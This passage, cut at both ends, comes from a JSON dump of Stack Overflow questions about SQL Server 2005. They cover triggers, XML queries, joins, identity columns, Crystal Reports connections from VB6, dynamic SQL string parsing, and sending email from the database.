NVARCHAR(50),\n      OS NVARCHAR(50),\n      PlatformVersion NVARCHAR(50)\n     )\n     INSERT INTO #TempXMLTable VALUES(\n           @XML.value('(/PLATFORM/PLATFORMNAME)[1]', 'nvarchar(MAX)'), \n      @XML.value('(/PLATFORM/OS)[1]', 'nvarchar(MAX)') ,\n      @XML.value('(/PLATFORM/VERSION)[1]', 'nvarchar(MAX)'))\n</code></pre>\n\n<p>When I do the above insert only the first column is inserted but I want both inserts</p>\n\n<p>Should look like - </p>\n\n<pre><code>                    PlatformName OS     Version\n                      Unix         Ipad    5.1\n                      Windows      Windows 2008\n</code></pre>\n"},{"tags":["sql","xml","sql-server-2005","query"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":562,"score":2,"question_id":8421509,"title":"How to add attributes to xml nodes in sql server 2005","body":"<p>If i wanted to add an attribute to the root element record, can i do this from the sql side?</p>\n\n<pre><code>SELECT top 1 'text' as nodeA\n                from test as z\nFOR XML AUTO, ELEMENTS, root('record')\n</code></pre>\n\n<p>i would like to produce the xml like this:</p>\n\n<pre><code> &lt;Root attribute=\"value\"&gt;\n     &lt;z&gt;\n         &lt;NodeA&gt;text&lt;/NodeA&gt;\n     &lt;/z&gt;\n &lt;/Root&gt;\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","triggers"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":265,"score":2,"question_id":3615951,"title":"Save Update attempts in temp table in Update Trigger","body":"<p>The query is -\nNo user should be able to change prices of the products Table. A msg shold be displayed to the user. also all attempts to change the price should be saved in temp table.</p>\n\n<p>How to solve this using update trigger in Sql server 2005?\nI have tried  as below. It is working as expected but also showing an error -</p>\n\n<p>The transaction ended in the trigger. The batch has been aborted.</p>\n\n<pre><code>ALTER TRIGGER tr_Products_U ON dbo.ProductDemo AFTER UPDATE\nAS\n    DECLARE @Data VARCHAR(200),\n            @sProductName NVARCHAR(40), \n            @mOldPrice MONEY, \n            @mNewPrice MONEY,\n            @ProductId int\n\n    IF UPDATE(ListPrice)\n    BEGIN\n        SELECT \n            @ProductId = d.ProductID,    \n            @sProductName = d.Name,\n            @mOldPrice = d.ListPrice,\n            @mNewPrice = i.ListPrice\n        FROM\n            inserted i INNER JOIN deleted d ON i.ProductID = d.ProductID \n\n        SET @Data = 'Tried to update the price of ' + @sProductName \n            + '  [ProductID :' + CONVERT(VARCHAR(10), @ProductId) + '] '\n            + ' from '\n            + CONVERT(VARCHAR(10), @mOldPrice) \n            + ' to ' + CONVERT(VARCHAR(10), @mNewPrice)\n\n            print 'Can''t Change Price' \n                       ROLLBACK TRAN \n\n                        INSERT INTO #UpdateLIstPrices  \n                        VALUES (@Data);         \n     END\n    RETURN\nGO\n</code></pre>\n"},{"tags":["sql","query","sql-server-2005","join","query-optimization"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":107,"score":0,"question_id":12519692,"title":"How does SQL OR query works","body":"<p>To my understinding it should be simple, does colA='X' or ColB='X', if any one of them is true then return the result otherwise not. </p>\n\n<pre><code>TableA\n╔════╦═══╦═══╦═══╦═══╗\n║ id ║ A ║ B ║ C ║ D ║\n╠════╬═══╬═══╬═══╬═══╣\n║ 1  ║ x ║ x ║ x ║ x ║\n║ 2  ║ x ║ x ║ x ║ x ║\n║ 3  ║ x ║ x ║ x ║ x ║\n╚════╩═══╩═══╩═══╩═══╝\n\nTableB\n╔════╦═══╗\n║ id ║ A ║\n╠════╬═══╣\n║  1 ║ x ║\n║  2 ║ x ║\n║  3 ║ x ║\n╚════╩═══╝\n\nselect T2.ID from tableA T1\nJOIN TableB T2\nON T1.A=T2.A OR T1.B=T2.A OR T1.C=T2.A OR T1.D=T2.A /* **takes 6+ min** */\n</code></pre>\n\n<p><strong>This simple join takes 6+ minutes.</strong> If I join using only one field, then it is pretty quick. <strong>Also if I write 4 different queries, one for each OR and then Union the result, it is very quick also</strong>.</p>\n\n<p>My question is, <strong>How does SQL OR Query works?</strong> Does it work on current row, does all the ORING and move on to the next or does it do the <em>complete OR</em> of the two tables for <em>each OR</em>. Even then it should take long as seperate queries are fast enough. I out think an internal optimiser can optiise this really quick: I am comparing one column from one table to 4 column of second table. It should be easy to optimise. Why is it taking so long? <strong>Is there a way to manually optimize this query</strong>. Btw I tried changing = to != or Or to AND but it takes the same amount of time.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12590473,"title":"Is it possible to Send and Receive TCP/Socket messages using SQL","body":"<p>Quick question, is it possible to send and receive TCP/Socket message using SQL? If there is one would you mind providing some examples or maybe direct me to a post/website where I could this information.</p>\n\n<p>thank you</p>\n"},{"tags":["c#","sql-server-2005","floating-point","decimal","informix"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":141,"score":1,"question_id":12407392,"title":"Comparing floating point / decimal values from Informix to SQL Server","body":"<p>I am trying to compare values from an Informix database and a SQL Server database. The problem I am getting is that Informix is returning the float as \"4000\" and SQL Server is returning it as \"40.000.000\".</p>\n\n<p>The datatype of the Informix column is \"float\" and the datatype of the SQL Server column is decimal(8,2).</p>\n\n<p>The comparison is happening in a C# application, and it is always failing because of what is returned. </p>\n\n<p>The data coming from the Informix database is being inserted directly into the SQL Server database, so the comparison should be accurate when pulling the values back out.</p>\n\n<p>I'm not sure how to tackle this. Any help would be greatly appreciated.</p>\n\n<p>Thank you!</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":12588471,"title":"Why can't I concatenate a value in the second part of the ISNULL statement?","body":"<p>I've already solved this issue using a CASE statement, but I'm wondering why, when using <code>ISNULL</code>, can I concatenate a value to the check_expression but not the replacement_value. Here's an example:</p>\n\n<pre><code>create table name_test \n(\n    nm          varchar(25)\n    ,mid_init   varchar(1)\n    ,name_type  int\n)\n\ninsert into name_test values('Joe',NULL,1)\ninsert into name_test values('Joe','X',2)\n</code></pre>\n\n<p>I have this query. </p>\n\n<pre><code>SELECT\n    n1.nm, isnull(n2.mid_init+'b',n1.mid_init) as m1,\n    isnull(n1.mid_init,n2.mid_init+'b') as m2\nFROM \n    name_test n1\n    JOIN name_test n2 \n    on n1.nm = n2.nm and n1.name_type = 1 and n2.name_type = 2\n</code></pre>\n\n<p>In the first statement (<code>m1</code>), I use the NOT-NULL value first, concatenated with a 'b'. In the second statement (<code>m2</code>), I use the NULL value first, so the query should pass through to the replacement_value. It does, but only takes the first value, not the concatenated value. </p>\n\n<p>Result:</p>\n\n<pre><code>nm     m1   m2\nJoe    Xb   X\n</code></pre>\n\n<p>With a little more investigation, I see that this query:</p>\n\n<pre><code>select \n    n1.nm, isnull(n2.mid_init+'b',n1.mid_init) as m1,\n    isnull(n1.mid_init,'1'+ n2.mid_init+'b') as m2\nfrom \n    name_test n1\n    join name_test n2 \n    on n1.nm = n2.nm and n1.name_type = 1 and n2.name_type = 2\n</code></pre>\n\n<p>returns </p>\n\n<pre><code>nm  m1  m2\nJoe Xb  1\n</code></pre>\n\n<p>So, the <code>ISNULL</code> function will take the entire <code>check_expression</code>, but if the <code>check_expression</code> is null, it will only take the first part of the <code>replacement_value</code>. </p>\n\n<p>Does anyone know why there is a discrepancy. Also, I solved it with a case - is there a better solution?</p>\n"},{"tags":["sql-server-2005","transactional-replication","secure-gateway"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12518276,"title":"SQL Server Replication across a unidirectional gateway","body":"<p>We would like to replicate a SQL Server 2005 database across a unidirectional gateway between a very secure Process LAN and a somewhat less secure Business LAN.  Does anyone know:</p>\n\n<ol>\n<li>If there is a way to have SQL Server perform the replication without handshaking from the target SQL Server/DB on the Business LAN?</li>\n<li>If a third party product or software library is available which will help with this desired functionality?</li>\n</ol>\n\n<p>Both the source and the target databases would be on a Windows Server 2003 or 2008 OS.</p>\n\n<p>Any alternate solutions or advise would be greatly appreciated.</p>\n"},{"tags":["sql-server-2005","reportingservices-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":2550,"score":0,"question_id":6505913,"title":"Installing SQL server 2005 reporting services on Windows 7","body":"<p>I am trying to install Microsoft SQL server standard editions 2005 reporting services on Windows 7. But the option to install reporting services are disabled in the setup. The same setup works for XP. I think there is some issue with IIS version. Please provide me the solution.</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":4220,"score":5,"question_id":2309028,"title":"Subtract minute from datatime in sql server 2005","body":"<p>Suppose I have a datetime field whose value is <strong>2000-01-01 08:30:00</strong> \nand a duration field whose value is say <strong>00:15</strong> (meaning 15 minutes) </p>\n\n<p>If I subtract these two, I should get <strong>2000-01-01 08:15:00</strong></p>\n\n<p>Also if I want to subtract <strong>1:15</strong> (means 1 hour 15 minutes), the output should be <strong>2000-01-01 07:15:00</strong></p>\n\n<p>I am trying <code>SELECT DATEDIFF(minute, '00:15','2000-01-01 08:30:00');</code> </p>\n\n<p>But the output is 52595055. How can i get the desired result?</p>\n\n<p>N.B.~ If I do <code>SELECT dateadd(minute, -15,'2000-01-01 08:30:00');</code> , I will get the desired result but that involves parsing the minute field. </p>\n\n<p>Edit:</p>\n\n<p>As per the answers, every one is suggesting converting everything into minutes and then to subtract - so if it is 1:30, i need to subtract 90 minutes. That's fine. Any other way without converting to minutes?</p>\n"},{"tags":["sql-server-2005","indexing"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":43,"score":2,"question_id":12585855,"title":"Why am I getting a Clustered Index Scan when the column is indexed?","body":"<p>So, we have a table, <code>InventoryListItems</code>, that has several columns. Because we're going to be looking for rows at times based on a particlar column (<code>g_list_id</code>, a foreign key), we have that foreign key column placed into a non-clustered index we'll call <code>MYINDEX</code>.  </p>\n\n<p>So when I search for data like this:</p>\n\n<pre><code>-- fake data for example\nDECLARE @ListId uniqueidentifier\nSELECT @ListId = '7BCD0E9F-28D9-4F40-BD67-803005179B04' \n\nSELECT *\nFROM [dbo].[InventoryListItems]\nWHERE [g_list_id] = @ListId\n</code></pre>\n\n<p>I expected that it would use the <code>MYINDEX</code> index to find just the needed rows, and then look up the information in those rows.  So not as good as just finding everything we need in the index itself, but still a big win over doing a full scan of the table.</p>\n\n<p>But instead it seems that I'm still getting a clustered index scan. I can't figure out why that would happen.</p>\n\n<p>If I do something like SELECTing only the values in the included columns of the index, it does what I would expect, an index seek, and just pulls everything from the index.</p>\n\n<p>But if I <code>SELECT *</code>, why does it just bail on the index and do a scan when it seems like it would still benefit greatly from using it because it's referenced in the WHERE clause?</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":31,"score":2,"question_id":12584672,"title":"Why execution time of a query and a function may be different","body":"<p>It's not clear for me why the execution time of scalar-function could be at least two times  longer than individual query, based on function's body.\nDetails:\nI wrote sql-query (declaring variables as parameters) and covered it with \"set statistics time on\" and run it. After that I've covered the sql-query into scalar-function and executed it with statistics time on again. The result confused me: execution time in the second case was much longer than in the first case (at least two times longer).</p>\n"},{"tags":["sql-server-2005","vb6","crystal-reports-8.5"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":192,"score":1,"question_id":12584496,"title":"Change Crystal Reports 8.5 connection to SQL Server 2005 dynamically in VB6","body":"<p>We need to connect some Crystal Reports 8.5 to a SQL Server database under MS Windows 7, 64 bit. The query are not handled by the VB6 code of our application, but is included in the Reports and by the time, we would like to avoid passing to the Reports data extracted from the code, because we should modify all the Reports deeply.\nSince the application will be installed on different locations, where the connection data will vary, we need to change this information at runtime, by vb6 code, so that the reports point to the appropriate data.\nThis is the test code we use:</p>\n\n<pre><code>    Dim nTables As Integer\n    Dim iCount As Integer\n    Dim iRitCW As Integer\n\n\n    '-----&gt; Ritorno msgBox\n    Dim RitMsg As Integer\n    Dim sRitCW As String * 255\n\n    jobnum = 0\n\n    If PEOpenEngine() = False Then\n        MsgBox \"Errore Engine\"\n    End If\n\n    jobnum = PEOpenPrintJob(\"c:\\test\\report1.rpt\")\n\n'Declarations\nDim logonInfo As PELogOnInfo\n\nlogonInfo.StructSize = PE_SIZEOF_LOGON_INFO\nlogonInfo.ServerName = \"dellone\\sqlexpress2005\" + Chr(0)\nlogonInfo.DatabaseName = \"TEST\" + Chr(0)\nlogonInfo.UserID = \"sa\" + Chr(0)\nlogonInfo.Password = \"sasasa_2005\" + Chr(0)\n\nIf (PELogOnServer(\"p2smon.dll\", logonInfo) = False) Then\n        MsgBox \"Connessione fallita\", vbExclamation, NomeApplicazione\n        iRitCW = PEGetErrorCode(jobnum)\n        RitMsg = MsgBox(\"Errore n. : \" + Str(iRitCW), vbExclamation, NomeApplicazione)\n        End\nEnd If\n\nnTables = PEGetNTables(jobnum)\n\nFor iCount = 0 To nTables - 1\n    If PESetNthTableLogOnInfo(jobnum, iCount, logonInfo, True) = False Then\n        MsgBox \"Errore : PESetNthTableLogOn\", vbExclamation, NomeApplicazione\nScreen.MousePointer = 0\n        Exit Sub\n    End If\n   If (PETestNthTableConnectivity(jobnum, iCount) = False) Then\n      MsgBox (\"Errore nella connessione per la tabella:\" &amp; iCount)\n   End If\nNext iCount\n\n\n\n      If PEOutputToPrinter(jobnum, 1) = False Then\nMsgBox \"Stampa del documento fallita\", vbExclamation, NomeApplicazione\nScreen.MousePointer = 0\nExit Sub\nEnd If\n\n    If PEStartPrintJob(jobnum, True) = False Then\n        MsgBox \"Stampa in anteprima fallita\", vbExclamation, NomeApplicazione\n        iRitCW = PEGetErrorCode(jobnum)\n        RitMsg = MsgBox(\"Errore di stampa n. : \" + Str(iRitCW), vbExclamation, NomeApplicazione)\n        Exit Sub\n    End If\nScreen.MousePointer = 0\n</code></pre>\n\n<p>Normally the error that is reported is 536 on PELogonServer and is 599 after PEStartPrintJob.\nWe therefore ask whethere the data wich wich we use to initialize the logoninfo data structure are sintactically correct. If the ServerName string has to be escaped in some particular way. We ask confirmation about the dll we use (“p2smon.dll”) in PELogOnServer function, whereas we tried without success with “p2ssql.dll” and any further explanation that may help us to solve the problem.</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["c#","sql-server-2008","sql-server-2005","c#-4.0","windowservice"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12583395,"title":"Window Service waiting store procedure to get the results","body":"<p>I am running a stored procedure from <code>C#</code> <code>Window Service</code>. Stored proc is a quite heavy query and it takes quite long time. </p>\n\n<p>I want to wait till the stored proc finish and return the values. </p>\n\n<p>Is there any way to determine that stored proc is finished.</p>\n\n<p>If anyone can provide the sample code that will be a great favour. </p>\n\n<p>Many Thanks</p>\n"},{"tags":["sql","query","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":12583063,"title":"How can I JOIN tables conditionally?","body":"<p>I am working with a badly designed database and I ran into some problem.</p>\n\n<p>I have two tables that I need to join on a 'not unique ID'.\nThe software that currently works with the database sets a '0 value' in the id if there is an error. This means if I try to join them a massive amount of records is joined on the 0 values.</p>\n\n<p>Underneath an example of two tables and their not unique id fields i want to join them on</p>\n\n<pre><code>tbl1    tbl2\n-----------       \n2        2\n3        6\n4        5\n0        3\n0        4\n6        0\n5        0\n----------\n</code></pre>\n\n<p>What I want to achieve is this</p>\n\n<pre><code>tbl1    tbl2\n-----------         \n2        2\n3        3\n4        4\n0        * (no join)\n0        * (no join)\n6        6\n5        5\n----------\n</code></pre>\n\n<p>In other words, I don't want the '0 values' from tbl1 to join with all other '0 values' from tbl2. I still want to have the record tbl1 without a join though.</p>\n\n<p>Is this possible in 1 query?</p>\n\n<p>extra information: SQL SERVER 2005 and there is no option to make the ID's unique.</p>\n"},{"tags":["sql-server-2005","case","where-clause"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":61,"score":3,"question_id":12553616,"title":"Passing comparison operator to WHERE clause","body":"<p>I would like to use a parameter which holds comparison operators like <code>'='</code>, <code>'&gt;'</code>, <code>'&gt;='</code> and use it in where clause with \"case when then\" or if statement like the following:  </p>\n\n<pre><code>WHERE  \ncase @Operator\n when '=' then (@Amount is null) or (@Amount = 0 ) or (Amount= @Amount)  \n when '&gt;' then (@Amount is null) or (@Amount = 0 ) or (Amount&gt; @Amount)  \n when '&gt;=' then (@Amount is null) or (@Amount = 0 ) or (Amount&gt;= @Amount)      \nEND\n</code></pre>\n"},{"tags":["c#","sql","sql-server","sql-server-2005","ado.net"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":91,"score":-6,"question_id":12581230,"title":"Which Error Code is return in SQL Server when inserting duplicate value in primary key column (table)","body":"<p>Which Error Code is return in SQL Server when inserting duplicate value in primary key column (table) </p>\n\n<pre><code>  try\n     {\n         dataAdapterObj = new  SqlDataAdapter(selectString, conObj);\n         return true;\n     }\n     catch (Exception e)\n     {\n         MessageBox.Show(\"Exception is : \" + e.ToString());\n         return false;\n     }\n</code></pre>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12580078,"title":"Operate pairs from 2 tables in SQL","body":"<p>Say I have the following situation: I have some cities with buildings.\nEach city is divided into districts. Each district should have a \"main house\" (one per district).</p>\n\n<p>I have (sql server 2005) a corresponding associate table <code>CITY_BUILDS (IDCITY, IDBUILD)</code><br>\nI have also a buildings table <code>BUILD (ID, DISTRICT, IS_MAIN, COLOR)</code></p>\n\n<p>So, say the city mayor decided to repaint the \"main house\" of the districts in the color of the first house in the district list (crazy idea, but anyway)</p>\n\n<p>I need to in a city foreach district select the \"main house\", then search for the first district house, peek its color and paint the main house.</p>\n\n<p>I started a stub for my procedure but soon got confused...</p>\n\n<pre><code>DECLARE L_CURSOR CURSOR FAST_FORWARD FOR\nSELECT B.DISTRICT, B.IS_MAIN, B.ID \nFROM BUILD B \n    INNER JOIN CITY_BUILDS C_B \n        ON B.ID = C_B.IDBUILD                   \nWHERE IDCITY = 142 --AND B.IS_MAIN=1\nORDER BY DISTRICT\n</code></pre>\n\n<p><strong>PS.</strong> By FIRST building, I mean ANY first occurrence in the CITY_BUILDS list...\nAlso, that \"FIRST\" house should not be the MainHouse itself...</p>\n\n<p><strong>PPS.</strong> I used a cursor, because once I obtain the pair (ID_MAIN_HOUSE - ID_FIRST_HOUSE) in the real project I need to do call a stored procedure with that 2 arguments and the COLOR...</p>\n"},{"tags":["c#","asp.net","sql-server-2005","c#-4.0"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12578717,"title":"error in connect to sqlserver in windows and sql authentication mode","body":"<p>i have a snippet that it work properly when i use windowsmode with follow connection string</p>\n\n<pre><code>data source=.;database=xDB;integrated security=true;\n</code></pre>\n\n<p>but i have to change it for sql and windows mode i changeit to</p>\n\n<pre><code>Data Source=.;Initial Catalog=xDB;User Id=krs;Password=12345;\n</code></pre>\n\n<p>but follow error occur </p>\n\n<blockquote>\n  <p>Login failed for user 'krs'. The user is not associated with a trusted SQL Server connection.</p>\n</blockquote>\n\n<p>and when change dot(.) to(local) another error occur</p>\n\n<blockquote>\n  <p>A network-related or instance-specific error occurred while establishing a connection to SQL Server. The server was not found or was not accessible. Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: Named Pipes Provider, error: 40 - Could not open a connection to SQL Server)</p>\n</blockquote>\n\n<p>plz help me im beginer  n confused.thank</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12577578,"title":"using IF and else in Where clause and using IN ( in where condition field)","body":"<p>I want to run the following query. <code>@city</code> value will be provided run time </p>\n\n<pre><code>Select * from Emp\n    where empno in (\n        if( @city = 'Bangalore')\n            Begin\n                Select Empno from Emp\n                    where EmpCity = @city\n            End\n        Else\n            Begin\n                Select empno from Emp\n        End\n    )\n</code></pre>\n\n<p>Kindly help me by providing alternative</p>\n"},{"tags":["sql","sql-server-2005","stored-procedures","dynamic"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":129,"score":1,"question_id":12568283,"title":"Getting a temporary table returned from dynamic SQL in SQL Server 2005, and parsing","body":"<p>So I was requested to make a few things.... (it is Monday morning and for some reason this whole thing is turning out to be really hard for me to explain so I am just going to try and post a lot of my code; sorry)  Oh - the table idea has to stay.  Anything else can be changed but the idea of this table and the parsed field was not my idea but it is my responsibility to execute and make work.  </p>\n\n<p><strong>Edit:</strong> Sorry the post is long.  I do suggest a few possible solutions throughout but my problem is ultimately how everything is returned in a dynamically defined table/table variable from something (sp,view,function,anything...).  Please take a minute to read the whole post... </p>\n\n<p>First, I needed a table:</p>\n\n<pre><code>CREATE TABLE TICKET_INFORMATION ( \n    TICKET_INFO_ID INT IDENTITY(1,1) NOT NULL, \n    TICKET_TYPE INT, \n    TARGET_ID INT, \n    TARGET_NAME VARCHAR(100), \n    INFORMATION VARCHAR(MAX),   \n    TIME_STAMP DATETIME DEFAULT GETUTCDATE()\n)\n\n-- insert this row for testing...  \nINSERT INTO TICKET_INFORMATION (TICKET_TYPE, TARGET_ID, TARGET_NAME, INFORMATION) VALUES (1,1,'RT_ID','IF_ID,int=1&amp;IF_ID,int=2&amp;OTHER,varchar(10)=val,ue3&amp;OTHER,varchar(10)=val,ue4')\n</code></pre>\n\n<p>The Information column holds data that needs to be parsed into a table.  This is where I am having problems.  In the resulting table, Target_Name needs to become a column that holds Target_ID as a value for each row in the resulting table.  </p>\n\n<p>The string that needs to be parsed is in this format:\n<code>@var_name1,@var_datatype1=@var_value1&amp;@var_name2,@var_datatype2=@var_value2&amp;@var_name3,@var_datatype3=@var_value3</code></p>\n\n<p>And what I ultimately need as a result (in a table or table variable):</p>\n\n<pre><code>RT_ID       IF_ID       OTHER\n1           1           val,ue3\n1           2           val,ue3\n1           1           val,ue4\n1           2           val,ue4\n</code></pre>\n\n<p>And I need to be able to join on the result.  Initially, I was just going to make this a function that returns a table variable but for some reason I can't figure out how to get it into  an actual table variable.  Whatever parses the string needs to be able to be used directly in queries so I don't think a stored procedure is really the right thing to be using.  </p>\n\n<p>This is the code that parses the Information string... it returns in a temporary table.  In the end, this needs to be passed either just the information string or an ID number or something... doesn't matter what.  Or somehow it can be in a view with the ticket_information table.</p>\n\n<pre><code>-- create/empty temp table for var_name, var_type and var_value fields \nif OBJECT_ID('tempdb..#temp') is not null drop table #temp\ncreate table #temp (row int identity(1,1), var_name varchar(max), var_type varchar(30), var_value varchar(max)) \n\n-- just setting stuff up\ndeclare @target_name varchar(max), @target_id varchar(max), @info varchar(max)\n    set @target_name = (select target_name from ticket_information where ticket_info_id = 1) \n    set @target_id = (select target_id from ticket_information where ticket_info_id = 1) \n    set @info = (select information from ticket_information where ticket_info_id = 1) \n    --print @info\n\n-- some of these variables are re-used later    \ndeclare @col_type varchar(20), @query varchar(max), @select as varchar(max) \nset @query = 'select ' + @target_id + ' as ' + @target_name + ' into #target; '\nset @select = 'select * into ##global_temp from #target'  \n\n\ndeclare @var_name varchar(100), @var_type varchar(100), @var_value varchar(100) \ndeclare @comma_pos int, @equal_pos int, @amp_pos int        \n    set @comma_pos = 1\n    set @equal_pos = 1\n    set @amp_pos   = 0 \n\n-- while loop to parse the string into a table \nwhile @amp_pos &lt; len(@info) begin  \n\n    -- get new comma position\n    set @comma_pos  = charindex(',',@info,@amp_pos+1)   \n\n    -- get new equal position\n    set @equal_pos  = charindex('=',@info,@amp_pos+1)   \n\n    -- set stuff that is going into the table \n    set @var_name   = substring(@info,@amp_pos+1,@comma_pos-@amp_pos-1)  \n    set @var_type   = substring(@info,@comma_pos+1,@equal_pos-@comma_pos-1) \n\n    -- get new ampersand position \n    set @amp_pos    = charindex('&amp;',@info,@amp_pos+1) \n    if @amp_pos=0   or @amp_pos&lt;@equal_pos set @amp_pos = len(@info)+1\n\n    -- set last variable for insert into table \n    set @var_value  = substring(@info,@equal_pos+1,@amp_pos-@equal_pos-1)\n\n    -- put stuff into the temp table \n    insert into #temp (var_name, var_type, var_value) values (@var_name, @var_type, @var_value) \n\n    -- is this a new field?\n    if ((select count(*) from #temp where var_name = (@var_name)) = 1) begin \n        set @query = @query + ' create table #' + @var_name + '_temp (' + @var_name + ' ' + @var_type + '); '    \n        set @select = @select + ', #' + @var_name + '_temp '\n    end \n\n    set @query = @query + ' insert into #' + @var_name + '_temp values (''' + @var_value + '''); '   \nend \n\n\nif OBJECT_ID('tempdb..##global_temp') is not null drop table ##global_temp\nexec (@query + @select) \n\n--select @query\n--select @select \n\nselect * from ##global_temp \n</code></pre>\n\n<p>Okay.  So, the result I want and need is now in ##global_temp.  How do I put all of that into something that can be returned from a function (or something)?  Or can I get something more useful returned from the exec statement?  In the end, the results of the parsed string need to be in a table that can be joined on and used... Ideally this would have been a view but I guess it can't with all the processing that needs to be done on that information string.  </p>\n\n<p>Ideas?  </p>\n\n<p>Thanks!</p>\n\n<p><strong>Edit:</strong>  Still looking for answers to this.  I would love to have a function that returns a table variable but I don't know how to get the results into a table variable.  The result is currently in a global temporary table.  Would it work if I defined my table variable in the dynamic portion of the code and then it would just magically be there to return?  Or can I somehow select into a table variable from my global temp table, without first defining the columns of the table variable?  Or can I create the table variable when I execute the dynamic part?  The whole problem is because the columns of the end result are dynamic....... so..... I'm not sure how I could clarify the issues I'm having more.  <strong>If a function that returns a table is a good route to go - could someone please provide me with code or a link as an example for returning a table variable with a dynamic column definition from a function?  Plz, thnx.</strong></p>\n"},{"tags":["c#","asp.net",".net","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":12574658,"title":"SQL Server fire off a web request","body":"<p>Do to some constraints with a client's system and setup, I am wondering if it is possible for SQL Server to fire off a web request?</p>\n\n<p>I need to be able to send emails after a sql server column gets updated. I had a trigger with database mail but the database server on the client won't allow that. The alternative would have that figure fire off a web request when ready. I would do it via a web service on the web server and have it just poll the table, but that seems like a lot of wasteful cycles.</p>\n\n<p>Any ideas?</p>\n"},{"tags":["c#","asp.net",".net","sql-server-2005","email"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12573663,"title":"Sending email after a database column is updated","body":"<p>I have a web app for a client built in C# .Net 3.5. The web app does lots of things and there is one part where I send some data via an asychronous web request to do some processing on the database. This can take anywhere from 5 to 60 minutes.  </p>\n\n<p>I then created a SQL trigger that when the column in the database that uses the Database Mail to send mail (via msdb.dbo.sp_send_dbmail).</p>\n\n<p>This works fine, but our client forbids us to send mail from the database server.</p>\n\n<p>Anyone have an alternative to this?</p>\n"},{"tags":["sql-server","sql-server-2005","tsql","identity","sql-server-2005-express"],"answer_count":10,"favorite_count":5,"up_vote_count":30,"down_vote_count":1,"view_count":59531,"score":29,"question_id":751522,"title":"How to change identity column values programmatically?","body":"<p>I have a MS SQL 2005 database with a table Test with column ID. ID is a identity column. I have rows in this table and all of them have their corresponding ID autoincremented value.</p>\n\n<p>Now I would like to change every ID in this table like this:</p>\n\n<pre><code>ID = ID + 1\n</code></pre>\n\n<p>But when I do this I get error:</p>\n\n<pre><code>Cannot update identity column 'ID'.\n</code></pre>\n\n<p>I've tried with:</p>\n\n<pre><code>ALTER TABLE Test NOCHECK CONSTRAINT ALL \nset identity_insert ID ON\n</code></pre>\n\n<p>But this does not solve this problem.</p>\n\n<p>I need to have identity set to this column, but I need to change values as well from time to time. So my question is how to acomplish this task that is required by my project.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":4,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":4057,"score":6,"question_id":2265629,"title":"Transaction count after EXECUTE indicates that a COMMIT or ROLLBACK TRANSACTION statement is missing - SQL server 2005","body":"<p>I am getting the error from the application as following with SQL server 2005 </p>\n\n<blockquote>\n  <p>\"Transaction count after EXECUTE\n  indicates that a COMMIT or ROLLBACK\n  TRANSACTION statement is missing.\n  Previous count = 1,  current count =\n  0\"</p>\n</blockquote>\n\n<p>How can i find the stage where this error raised?\nhow can i found the missing transaction or the stored procedure where it is not committ or rollback?</p>\n"},{"tags":["c#","asp.net","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":254,"score":0,"question_id":7411879,"title":"How to create festival calendar in ASP.net","body":"<p>I want to make a festival calendar using asp.net from that I used two ajax calendar and one textbox it is a festival textbox where we enter festival which FromDate and ToDate respectively. I want to do this as following point</p>\n\n<ol>\n<li><p>If I enter in textbox Christmas and Choose Fromdate=25/12/2011 and ToDate=31/12/2011 then it will be valid</p></li>\n<li><p>If I choose fromDate=25/12/2011 and ToDate=24/12/2011 then it will invalid</p></li>\n<li><p>If I choose Fromdate=25/12/2011 and Todate=28/12/2011 then also it is invalid because it coming in between 25/12/2011 and 31/12/2011</p></li>\n<li><p>If I Choose fromdate=1/1/2011 and ToDate=1/1/2011 then it is valid</p></li>\n<li><p>If I choose fromdate=21/12/2011 and 25/12/2011 then it is invalid because of already Christmas done in 1/1/2011</p></li>\n</ol>\n\n<p>And all date should show in gridview like 25-dec-2011 format </p>\n\n<p>Here is my code:    </p>\n\n<pre><code>DateTime dt1 = Convert.ToDateTime(txt_fromdate.Text);\nDateTime 